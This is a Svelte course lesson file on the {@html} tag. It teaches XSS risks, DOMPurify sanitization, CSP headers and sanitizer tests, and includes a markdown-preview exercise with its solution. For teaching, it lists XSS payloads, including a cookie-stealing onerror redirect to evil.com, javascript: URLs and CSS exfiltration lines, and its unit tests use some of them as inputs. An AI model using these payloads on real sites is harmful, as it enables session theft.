import type { Lesson } from '$types/lesson';

export const rawHtmlAndSecurity: Lesson = {
	id: 'svelte-core.advanced-patterns.raw-html-and-security',
	slug: 'raw-html-and-security',
	title: 'Raw HTML with {@html} & Security',
	description:
		'Render raw HTML strings safely using {@html}, understand XSS risks, and learn sanitization patterns.',
	trackId: 'svelte-core',
	moduleId: 'advanced-patterns',
	order: 5,
	estimatedMinutes: 20,
	concepts: ['svelte5.template.html-tag', 'svelte5.security.xss-prevention', 'svelte5.template.render-vs-html'],
	prerequisites: ['svelte5.runes.state', 'svelte5.runes.derived', 'svelte5.components.basic'],

	content: [
		{
			type: 'text',
			content: `# Raw HTML with {@html} & Security

## Why {@html} Exists

By default, Svelte treats all expressions in templates as text. If you write \`{content}\` where \`content\` is \`"<strong>bold</strong>"\`, Svelte renders the literal string including the angle brackets -- the user sees \`<strong>bold</strong>\` as plain text on the page, not **bold** text. This is a critical security feature called output encoding or escaping. It prevents untrusted data from being interpreted as HTML.

But sometimes you genuinely need to render raw HTML. The most common scenarios are:

1. **CMS content** -- A headless CMS returns rich text as HTML. You receive \`"<h2>About Us</h2><p>We build tools...</p>"\` from an API and need to render it as actual DOM elements.

2. **Markdown rendering** -- You convert Markdown to HTML using a library like \`marked\` or \`markdown-it\`. The output is an HTML string that must be injected into the DOM.

3. **SVG from data** -- You generate SVG markup dynamically or receive it from an icon library as strings.

4. **Syntax-highlighted code** -- Libraries like \`highlight.js\` or \`shiki\` produce HTML strings with \`<span>\` elements for colored tokens.

5. **Rich text editors** -- WYSIWYG editors like TipTap or Quill produce HTML output that you need to display.

For all these cases, Svelte provides the \`{@html}\` tag:

\`\`\`svelte
<script lang="ts">
  const htmlContent = '<p>This is <strong>bold</strong> and <em>italic</em> text.</p>';
</script>

{@html htmlContent}
\`\`\`

The \`{@html}\` tag takes a string expression and injects it directly into the DOM as HTML. Svelte does not escape the content -- it is inserted as-is using \`innerHTML\` under the hood. The result is real DOM elements, not text nodes.

## The XSS Danger: NEVER Use {@html} with Unsanitized User Input

This is the most important security lesson in all of Svelte development. The \`{@html}\` tag is a direct injection point for Cross-Site Scripting (XSS) attacks. If you pass user-controlled content to \`{@html}\` without sanitization, an attacker can execute arbitrary JavaScript in your users' browsers.

Here is a concrete attack scenario:

\`\`\`svelte
<script lang="ts">
  // DANGEROUS: user-provided content rendered as raw HTML
  let comment = $state('');
</script>

<input bind:value={comment} placeholder="Write a comment..." />
<div class="preview">
  {@html comment}  <!-- XSS VULNERABILITY -->
</div>
\`\`\`

If a user types the following into the input:

\`\`\`html
<img src="x" onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
\`\`\`

The \`{@html}\` tag injects this as a real \`<img>\` element. The browser tries to load the image from \`"x"\`, fails, and executes the \`onerror\` handler -- which redirects the user to an attacker-controlled server, sending their session cookie in the URL. The attacker now has the user's session.

### Comprehensive XSS Attack Vector Catalog

Understanding the full range of attack vectors helps you appreciate why sanitization must be thorough. Here are the most common and dangerous patterns:

**Event handler injection** -- The most versatile attack vector. Almost any HTML element can carry an event handler:
- \`<img src="x" onerror="maliciousCode()">\` -- Fires immediately when src fails
- \`<svg onload="maliciousCode()">\` -- SVG event handlers DO execute
- \`<body onload="maliciousCode()">\` -- Body load events
- \`<input onfocus="maliciousCode()" autofocus>\` -- Auto-triggered via autofocus
- \`<marquee onstart="maliciousCode()">\` -- Legacy elements still work
- \`<video><source onerror="maliciousCode()"></video>\` -- Nested elements

**Script injection** -- Note: scripts inserted via \`innerHTML\` do not execute in modern browsers, but this is NOT a reliable defense:
- \`<script>alert('XSS')</script>\` -- Blocked by innerHTML but NOT by document.write
- \`<script src="https://evil.com/payload.js"></script>\` -- Also blocked by innerHTML

**URL scheme attacks** -- JavaScript can execute from URL attributes:
- \`<a href="javascript:maliciousCode()">Click me</a>\` -- JavaScript URLs execute on click
- \`<iframe src="javascript:maliciousCode()">\` -- Executes in iframe context
- \`<form action="javascript:maliciousCode()">\` -- Executes on form submit
- \`<object data="javascript:maliciousCode()">\` -- Executes via object element

**CSS-based attacks** -- Less obvious but still dangerous:
- \`<style>body { display: none }</style>\` -- CSS injection can hide the page
- \`<style>* { background: url('https://evil.com/track?data=' + ...) }</style>\` -- Data exfiltration via CSS
- \`<div style="background: url('https://evil.com/log')">\` -- Single-element tracking

**Embedding attacks:**
- \`<iframe src="https://evil.com/phishing-page"></iframe>\` -- Embed phishing content
- \`<object data="https://evil.com/malware.swf">\` -- Embed executable content
- \`<embed src="https://evil.com/payload">\` -- Similar to object

**Mutation XSS (mXSS)** -- Content that looks safe in one context but becomes dangerous after DOM parsing:
- \`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>\` -- The browser's HTML parser may restructure this HTML, causing sanitizers to miss the payload

The rule is absolute: **never pass unsanitized user input to {@html}**. If the content comes from a user, a URL parameter, a database field that users can edit, or any other untrusted source, it MUST be sanitized first.`
		},
		{
			type: 'concept-callout',
			content: 'svelte5.security.xss-prevention'
		},
		{
			type: 'text',
			content: `## Sanitizing HTML with DOMPurify

The gold standard for HTML sanitization in JavaScript is DOMPurify. It parses HTML and removes any elements, attributes, or URI schemes that could execute scripts, while preserving safe formatting elements.

\`\`\`bash
npm install dompurify
npm install -D @types/dompurify
\`\`\`

\`\`\`svelte
<script lang="ts">
  import DOMPurify from 'dompurify';

  let userContent = $state('<p>Hello <strong>world</strong></p><img src=x onerror=alert(1)>');

  const sanitized = $derived(DOMPurify.sanitize(userContent));
</script>

<div class="preview">
  {@html sanitized}
</div>
\`\`\`

DOMPurify strips the dangerous \`onerror\` attribute from the \`<img>\` tag. The output is \`<p>Hello <strong>world</strong></p><img src="x">\` -- safe to render.

### Configuring DOMPurify

DOMPurify is highly configurable. You can whitelist specific tags and attributes:

\`\`\`typescript
import DOMPurify from 'dompurify';

// Only allow basic formatting
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class']
});

// Strip everything -- return plain text
const plainText = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });

// Allow data attributes
const withData = DOMPurify.sanitize(dirty, {
  ADD_ATTR: ['data-id', 'data-type']
});
\`\`\`

### SSR Considerations: isomorphic-dompurify in SvelteKit

DOMPurify relies on the DOM API (\`document.createElement\`, etc.). On the server during SSR, there is no DOM. You have two options:

1. **Use \`isomorphic-dompurify\`** -- A wrapper that uses \`jsdom\` on the server:

\`\`\`bash
npm install isomorphic-dompurify
\`\`\`

\`\`\`typescript
import DOMPurify from 'isomorphic-dompurify';
// Works on both server and client
const clean = DOMPurify.sanitize(dirty);
\`\`\`

2. **Guard with browser check** -- Only sanitize on the client:

\`\`\`typescript
import { browser } from '$app/environment';
import DOMPurify from 'dompurify';

const sanitized = $derived(
  browser ? DOMPurify.sanitize(userContent) : ''
);
\`\`\`

Option 1 is preferred for SEO since the sanitized HTML is included in the server-rendered page.

### Server-Side Sanitization in SvelteKit Load Functions

The most secure pattern is to sanitize HTML on the server before it ever reaches the client. In SvelteKit, you can sanitize in your \`load\` function:

\`\`\`typescript
// +page.server.ts
import DOMPurify from 'isomorphic-dompurify';

export async function load({ params }) {
  const response = await fetch(\`https://cms.example.com/api/posts/\${params.slug}\`);
  const post = await response.json();

  return {
    title: post.title,
    // Sanitize before sending to client
    body: DOMPurify.sanitize(post.htmlBody, {
      ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'strong', 'em', 'a', 'ul', 'ol', 'li',
                     'blockquote', 'code', 'pre', 'img', 'figure', 'figcaption'],
      ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'target', 'rel'],
      ALLOW_DATA_ATTR: false
    }),
    publishedAt: post.publishedAt
  };
}
\`\`\`

\`\`\`svelte
<!-- +page.svelte -->
<script lang="ts">
  let { data } = $props();
</script>

<article>
  <h1>{data.title}</h1>
  {@html data.body}
</article>
\`\`\`

This pattern has several advantages. The sanitization happens on the server, so the client never receives unsanitized HTML. The DOMPurify configuration is centralized in one place. And the \`+page.server.ts\` file never runs in the browser, so you can use the full \`dompurify\` package without worrying about bundle size -- \`isomorphic-dompurify\` includes \`jsdom\`, but in a server-only file that cost is irrelevant.

## Content Security Policy (CSP) Integration

Even with DOMPurify, defense in depth is important. Content Security Policy headers provide a second layer of protection that limits what injected scripts can do, even if they somehow bypass sanitization.

### Setting CSP in SvelteKit

\`\`\`typescript
// svelte.config.js
const config = {
  kit: {
    csp: {
      directives: {
        'script-src': ['self'],
        'style-src': ['self', 'unsafe-inline'],  // needed for Svelte scoped styles
        'img-src': ['self', 'https://trusted-cdn.com'],
        'frame-src': ['none'],
        'object-src': ['none']
      }
    }
  }
};
\`\`\`

With this CSP in place, even if an attacker injects \`<script src="https://evil.com/payload.js"></script>\`, the browser will refuse to load it because \`evil.com\` is not in the \`script-src\` allowlist. This does not replace sanitization -- it is an additional safety net.

### CSP and {@html} Interaction

CSP's \`script-src\` directive blocks inline scripts and external script loads. This catches many XSS payloads but NOT all. Event handler attributes (\`onerror\`, \`onload\`, etc.) are governed by \`script-src\` in modern browsers if you omit \`'unsafe-inline'\` from the directive. However, CSS injection and URL-based attacks (\`javascript:\` URLs) require additional directives.

A robust CSP for applications using \`{@html}\` should include:

\`\`\`
script-src 'self' 'nonce-{random}';
style-src 'self' 'unsafe-inline';
img-src 'self' https:;
frame-src 'none';
object-src 'none';
base-uri 'self';
\`\`\`

The \`base-uri 'self'\` directive prevents \`<base>\` tag injection, which could redirect all relative URLs to an attacker-controlled domain. The \`frame-src 'none'\` prevents iframe injection for phishing.

## Building a Markdown Renderer

A classic use case for \`{@html}\` is rendering Markdown. Here is a complete pattern using the \`marked\` library:

\`\`\`svelte
<script lang="ts">
  import { marked } from 'marked';
  import DOMPurify from 'isomorphic-dompurify';

  let markdown = $state('# Hello World\\n\\nThis is **bold** and *italic*.');

  const html = $derived(DOMPurify.sanitize(marked.parse(markdown) as string));
</script>

<textarea bind:value={markdown} rows="8"></textarea>

<div class="preview">
  {@html html}
</div>
\`\`\`

The pipeline is: user types Markdown -> \`marked.parse()\` converts to HTML -> \`DOMPurify.sanitize()\` strips dangerous elements -> \`{@html}\` renders the safe HTML. Every step is reactive thanks to \`$derived\`.

**Your task:** Build a markdown preview component. Create a split-pane layout with a textarea on the left and the rendered preview on the right. Use the \`marked\` library (already available) to convert markdown to HTML, and DOMPurify to sanitize the output before passing it to \`{@html}\`.`
		},
		{
			type: 'checkpoint',
			content: 'cp-1'
		},
		{
			type: 'text',
			content: `## {@html} Does NOT Create Reactive Bindings

A critical limitation that trips up many developers: content rendered with \`{@html}\` is inert. Svelte does not process the HTML string -- it does not create component instances, bind event handlers, or set up reactive bindings within the injected HTML.

\`\`\`svelte
<script lang="ts">
  let count = $state(0);

  // This DOES NOT work as expected
  const dynamicHtml = $derived(
    \`<button onclick="count++">Count: \${count}</button>\`
  );
</script>

{@html dynamicHtml}
\`\`\`

The button renders visually, but clicking it throws a ReferenceError because \`count\` in the \`onclick\` attribute refers to a global \`count\` variable (which does not exist), not the Svelte component's reactive \`count\` state. Inline event handlers in \`{@html}\` strings are plain HTML event attributes -- they execute in the global scope, completely disconnected from Svelte's reactivity system.

Similarly, Svelte directives do not work inside \`{@html}\`:

\`\`\`svelte
<!-- NONE of these work inside {@html} -->
{@html '<input bind:value={name} />'}
{@html '<div on:click={handler}>'}
{@html '<Component />'}
{@html '<div transition:fade>'}
\`\`\`

The string is injected as raw HTML. Svelte never compiles it, so directives like \`bind:\`, \`on:\`, \`transition:\`, and component references are meaningless.

### When You Need Interactive Injected Content

If you need to add event listeners to \`{@html}\` content, use an \`$effect\` to query the rendered DOM:

\`\`\`svelte
<script lang="ts">
  let container: HTMLDivElement;
  const htmlContent = '<button class="action-btn">Click Me</button>';

  $effect(() => {
    const buttons = container.querySelectorAll('.action-btn');
    const handler = () => console.log('Clicked!');

    buttons.forEach(btn => btn.addEventListener('click', handler));

    return () => {
      buttons.forEach(btn => btn.removeEventListener('click', handler));
    };
  });
</script>

<div bind:this={container}>
  {@html htmlContent}
</div>
\`\`\`

This pattern queries the DOM after \`{@html}\` renders, attaches listeners manually, and cleans them up when the effect re-runs or the component unmounts.

## {@html} vs {@render}

Svelte 5 introduced the \`{@render}\` tag for rendering snippets. It is important to understand the difference:

| Feature | \`{@html string}\` | \`{@render snippet()}\` |
|---|---|---|
| Input | HTML string | Snippet (compiled Svelte template) |
| Reactive bindings | No | Yes |
| Event handlers | No (plain HTML only) | Yes (Svelte event handling) |
| Component support | No | Yes |
| XSS risk | Yes (if unsanitized) | No (compiled at build time) |
| Use case | External HTML (CMS, markdown) | Reusable template fragments |

\`{@render}\` is always preferred when you control the template content. It is type-safe, reactive, and cannot introduce XSS vulnerabilities. Use \`{@html}\` only when you receive HTML as a string from an external source.

**Task:** Add a "source view" toggle to your markdown preview. When toggled on, show the raw HTML output from \`marked\` (as escaped text, NOT rendered) alongside the rendered preview. This demonstrates the difference between \`{@html sanitizedHtml}\` (renders as DOM) and \`{sanitizedHtml}\` (displays as text).`
		},
		{
			type: 'checkpoint',
			content: 'cp-2'
		},
		{
			type: 'xray-prompt',
			content: `A developer writes this component:

\`\`\`svelte
<script lang="ts">
  let comments: string[] = $state([]);
  let newComment = $state('');

  function addComment() {
    comments.push(newComment);
    newComment = '';
  }
</script>

<input bind:value={newComment} />
<button onclick={addComment}>Post</button>

{#each comments as comment}
  <div class="comment">
    {@html comment}
  </div>
{/each}
\`\`\`

Explain every way an attacker could exploit this code. Then rewrite it to be secure, keeping the ability to render basic formatting (bold, italic, links) from user input. What library would you use and how would you configure it?`
		},
		{
			type: 'text',
			content: `## Testing Sanitization

When you use \`{@html}\` in a production application, you should test that your sanitization is working correctly. Testing sanitization catches configuration mistakes before they reach production.

### Unit Testing DOMPurify Configuration

\`\`\`typescript
// sanitize.ts -- centralized sanitization config
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeComment(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'code'],
    ALLOWED_ATTR: ['href', 'target', 'rel']
  });
}

// sanitize.test.ts
import { describe, it, expect } from 'vitest';
import { sanitizeComment } from './sanitize';

describe('sanitizeComment', () => {
  it('preserves safe formatting tags', () => {
    const input = '<p>Hello <strong>world</strong></p>';
    expect(sanitizeComment(input)).toBe('<p>Hello <strong>world</strong></p>');
  });

  it('strips script tags', () => {
    const input = '<script>alert("xss")</script><p>safe</p>';
    expect(sanitizeComment(input)).toBe('<p>safe</p>');
  });

  it('strips event handlers from elements', () => {
    const input = '<img src="x" onerror="alert(1)">';
    const result = sanitizeComment(input);
    expect(result).not.toContain('onerror');
  });

  it('strips javascript: URLs', () => {
    const input = '<a href="javascript:alert(1)">click</a>';
    const result = sanitizeComment(input);
    expect(result).not.toContain('javascript:');
  });

  it('strips iframe elements', () => {
    const input = '<iframe src="https://evil.com"></iframe><p>safe</p>';
    expect(sanitizeComment(input)).toBe('<p>safe</p>');
  });

  it('strips SVG with onload', () => {
    const input = '<svg onload="alert(1)"><circle r="10"/></svg>';
    const result = sanitizeComment(input);
    expect(result).not.toContain('onload');
  });

  it('preserves safe links with href', () => {
    const input = '<a href="https://svelte.dev">Svelte</a>';
    expect(sanitizeComment(input)).toBe('<a href="https://svelte.dev">Svelte</a>');
  });

  it('strips disallowed tags but keeps content', () => {
    const input = '<div><span>hello</span></div>';
    expect(sanitizeComment(input)).toBe('hello');
  });
});
\`\`\`

### Integration Testing with Svelte Components

For component-level testing, verify that the rendered output contains sanitized HTML:

\`\`\`typescript
// CommentPreview.test.ts
import { render } from '@testing-library/svelte';
import CommentPreview from './CommentPreview.svelte';

it('renders sanitized HTML without script execution', () => {
  const maliciousInput = '<img src=x onerror=alert(1)><p>legit content</p>';
  const { container } = render(CommentPreview, { props: { content: maliciousInput } });

  // Verify the onerror attribute was stripped
  const img = container.querySelector('img');
  expect(img?.getAttribute('onerror')).toBeNull();

  // Verify safe content is preserved
  expect(container.textContent).toContain('legit content');
});
\`\`\`

### Key Testing Principles

1. **Test known attack vectors.** Maintain a list of XSS payloads and verify each is neutralized.
2. **Test allowlist boundaries.** Verify that allowed tags and attributes are preserved while everything else is stripped.
3. **Test edge cases.** Nested tags, malformed HTML, mixed content, and very long strings.
4. **Update tests when DOMPurify is upgraded.** New versions may change default behavior.

## Advanced Patterns with {@html}

### Syntax Highlighting

Rendering syntax-highlighted code is a safe use of \`{@html}\` because the HTML comes from a trusted library, not user input:

\`\`\`svelte
<script lang="ts">
  import hljs from 'highlight.js';

  let code = $state('const greeting = "Hello, Svelte!";');
  let language = $state('typescript');

  const highlighted = $derived(
    hljs.highlight(code, { language }).value
  );
</script>

<pre><code>{@html highlighted}</code></pre>
\`\`\`

The \`highlight.js\` library produces HTML with \`<span>\` elements for syntax tokens. The input (\`code\`) is the raw source code string, and \`highlight.js\` escapes it internally before wrapping tokens in spans. This is safe because the library controls the output format.

### Conditional {@html}

You can use \`{@html}\` inside conditional blocks and each blocks:

\`\`\`svelte
{#if contentType === 'html'}
  {@html sanitizedContent}
{:else}
  <p>{plainTextContent}</p>
{/if}

{#each articles as article}
  <article>
    <h2>{article.title}</h2>
    {@html article.sanitizedBody}
  </article>
{/each}
\`\`\`

### Performance Notes

Every time the expression passed to \`{@html}\` changes, Svelte destroys all DOM nodes inside the injection point and creates new ones from the updated HTML string. This is more expensive than Svelte's normal fine-grained DOM updates. If you have frequently changing HTML content, consider whether a Svelte snippet or component would be more appropriate.

For large HTML documents (like a full blog post), the initial \`{@html}\` render is fast because the browser's HTML parser is highly optimized. But subsequent updates replace the entire HTML block. If only a small part changes, the browser still rebuilds the complete DOM tree for that \`{@html}\` block.

## Summary

The \`{@html}\` tag renders raw HTML strings into the DOM without escaping. It exists for legitimate use cases like CMS content, markdown rendering, SVG injection, and syntax highlighting. The critical rule: never use \`{@html}\` with unsanitized user input. Always sanitize with DOMPurify (or \`isomorphic-dompurify\` for SSR). For server-rendered SvelteKit applications, sanitize in load functions before data reaches the client. Layer Content Security Policy headers as defense in depth. Test your sanitization configuration with known attack vectors. Remember that \`{@html}\` content is inert -- no Svelte bindings, events, or components work inside it. For interactive template fragments, use \`{@render}\` with snippets instead. When you must add interactivity to \`{@html}\` content, use \`$effect\` with manual DOM queries and event listeners.`
		},
		{
			type: 'concept-callout',
			content: 'svelte5.template.html-tag'
		}
	],

	starterFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  // TODO: Import marked from 'marked'
  // TODO: Import DOMPurify from 'isomorphic-dompurify'

  let markdown = $state(\`# Welcome to the Markdown Preview

## Features

- **Bold text** and *italic text*
- [Links](https://svelte.dev)
- Code: \\\`const x = 42;\\\`

> A blockquote for emphasis.

### Try Editing!

Type some markdown in this editor and see it rendered in real-time.
\`);

  let showSource = $state(false);

  // TODO: Convert markdown to HTML with marked.parse()
  // TODO: Sanitize the HTML with DOMPurify.sanitize()
</script>

<div class="editor-container">
  <div class="pane editor-pane">
    <div class="pane-header">
      <h3>Markdown</h3>
    </div>
    <textarea bind:value={markdown}></textarea>
  </div>

  <div class="pane preview-pane">
    <div class="pane-header">
      <h3>Preview</h3>
      <label>
        <input type="checkbox" bind:checked={showSource} />
        Show HTML source
      </label>
    </div>
    <div class="preview-content">
      <!-- TODO: If showSource is true, display the raw HTML as text -->
      <!-- TODO: If showSource is false, render with {@html} -->
      <p class="placeholder">Rendered preview will appear here</p>
    </div>
  </div>
</div>

<style>
  .editor-container {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    height: 500px;
    font-family: system-ui, sans-serif;
    padding: 1rem;
  }

  .pane {
    display: flex;
    flex-direction: column;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    overflow: hidden;
  }

  .pane-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.5rem 1rem;
    background: #f8fafc;
    border-bottom: 1px solid #e2e8f0;
  }

  .pane-header h3 {
    margin: 0;
    font-size: 0.9rem;
    color: #475569;
  }

  .pane-header label {
    font-size: 0.8rem;
    color: #64748b;
    display: flex;
    align-items: center;
    gap: 0.25rem;
    cursor: pointer;
  }

  textarea {
    flex: 1;
    padding: 1rem;
    border: none;
    resize: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.875rem;
    line-height: 1.6;
    outline: none;
  }

  .preview-content {
    flex: 1;
    padding: 1rem;
    overflow-y: auto;
    line-height: 1.7;
  }

  .preview-content :global(h1) { font-size: 1.5rem; margin-top: 0; }
  .preview-content :global(h2) { font-size: 1.25rem; color: #334155; }
  .preview-content :global(h3) { font-size: 1.1rem; color: #475569; }
  .preview-content :global(code) {
    background: #f1f5f9;
    padding: 0.15rem 0.4rem;
    border-radius: 4px;
    font-size: 0.85em;
  }
  .preview-content :global(blockquote) {
    border-left: 3px solid #3b82f6;
    margin-left: 0;
    padding-left: 1rem;
    color: #64748b;
  }
  .preview-content :global(a) {
    color: #3b82f6;
    text-decoration: underline;
  }

  .placeholder {
    color: #94a3b8;
    font-style: italic;
  }

  pre.source {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1rem;
    border-radius: 6px;
    font-size: 0.8rem;
    white-space: pre-wrap;
    word-break: break-all;
  }
</style>`
		}
	],

	solutionFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  import { marked } from 'marked';
  import DOMPurify from 'isomorphic-dompurify';

  let markdown = $state(\`# Welcome to the Markdown Preview

## Features

- **Bold text** and *italic text*
- [Links](https://svelte.dev)
- Code: \\\`const x = 42;\\\`

> A blockquote for emphasis.

### Try Editing!

Type some markdown in this editor and see it rendered in real-time.
\`);

  let showSource = $state(false);

  const rawHtml = $derived(marked.parse(markdown) as string);
  const sanitizedHtml = $derived(DOMPurify.sanitize(rawHtml));
</script>

<div class="editor-container">
  <div class="pane editor-pane">
    <div class="pane-header">
      <h3>Markdown</h3>
    </div>
    <textarea bind:value={markdown}></textarea>
  </div>

  <div class="pane preview-pane">
    <div class="pane-header">
      <h3>Preview</h3>
      <label>
        <input type="checkbox" bind:checked={showSource} />
        Show HTML source
      </label>
    </div>
    <div class="preview-content">
      {#if showSource}
        <pre class="source">{sanitizedHtml}</pre>
      {:else}
        {@html sanitizedHtml}
      {/if}
    </div>
  </div>
</div>

<style>
  .editor-container {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    height: 500px;
    font-family: system-ui, sans-serif;
    padding: 1rem;
  }

  .pane {
    display: flex;
    flex-direction: column;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    overflow: hidden;
  }

  .pane-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.5rem 1rem;
    background: #f8fafc;
    border-bottom: 1px solid #e2e8f0;
  }

  .pane-header h3 {
    margin: 0;
    font-size: 0.9rem;
    color: #475569;
  }

  .pane-header label {
    font-size: 0.8rem;
    color: #64748b;
    display: flex;
    align-items: center;
    gap: 0.25rem;
    cursor: pointer;
  }

  textarea {
    flex: 1;
    padding: 1rem;
    border: none;
    resize: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.875rem;
    line-height: 1.6;
    outline: none;
  }

  .preview-content {
    flex: 1;
    padding: 1rem;
    overflow-y: auto;
    line-height: 1.7;
  }

  .preview-content :global(h1) { font-size: 1.5rem; margin-top: 0; }
  .preview-content :global(h2) { font-size: 1.25rem; color: #334155; }
  .preview-content :global(h3) { font-size: 1.1rem; color: #475569; }
  .preview-content :global(code) {
    background: #f1f5f9;
    padding: 0.15rem 0.4rem;
    border-radius: 4px;
    font-size: 0.85em;
  }
  .preview-content :global(blockquote) {
    border-left: 3px solid #3b82f6;
    margin-left: 0;
    padding-left: 1rem;
    color: #64748b;
  }
  .preview-content :global(a) {
    color: #3b82f6;
    text-decoration: underline;
  }

  .placeholder {
    color: #94a3b8;
    font-style: italic;
  }

  pre.source {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1rem;
    border-radius: 6px;
    font-size: 0.8rem;
    white-space: pre-wrap;
    word-break: break-all;
  }
</style>`
		}
	],

	checkpoints: [
		{
			id: 'cp-1',
			description: 'Build a markdown preview with marked and DOMPurify sanitization',
			validation: {
				type: 'code-pattern',
				config: {
					patterns: [
						{ type: 'contains', value: '{@html' },
						{ type: 'contains', value: 'DOMPurify' },
						{ type: 'contains', value: 'marked' }
					]
				}
			},
			hints: [
				'Import `marked` from `marked` and `DOMPurify` from `isomorphic-dompurify`. Use `marked.parse(markdown)` to convert the markdown string to HTML.',
				'Create a `$derived` for the sanitized HTML: `const sanitizedHtml = $derived(DOMPurify.sanitize(marked.parse(markdown) as string))`. The `as string` cast is needed because `marked.parse` can return a `Promise`.',
				'Render with `{@html sanitizedHtml}` in the preview pane. The `$derived` ensures the preview updates reactively whenever the markdown text changes.'
			],
			conceptsTested: ['svelte5.template.html-tag', 'svelte5.security.xss-prevention']
		},
		{
			id: 'cp-2',
			description: 'Add a source view toggle showing raw HTML as escaped text vs rendered HTML',
			validation: {
				type: 'code-pattern',
				config: {
					patterns: [
						{ type: 'contains', value: 'showSource' },
						{ type: 'contains', value: '{@html' },
						{ type: 'contains', value: '{#if' }
					]
				}
			},
			hints: [
				'Create a `let showSource = $state(false)` and bind it to a checkbox: `<input type="checkbox" bind:checked={showSource} />`.',
				'Use an `{#if showSource}` block. In the truthy branch, show `<pre class="source">{sanitizedHtml}</pre>` (note: no `@html`, so it displays as escaped text). In the else branch, show `{@html sanitizedHtml}`.',
				'This demonstrates the key difference: `{expression}` escapes HTML entities and shows the raw markup as text, while `{@html expression}` renders it as actual DOM elements.'
			],
			conceptsTested: ['svelte5.template.html-tag', 'svelte5.template.render-vs-html']
		}
	]
};
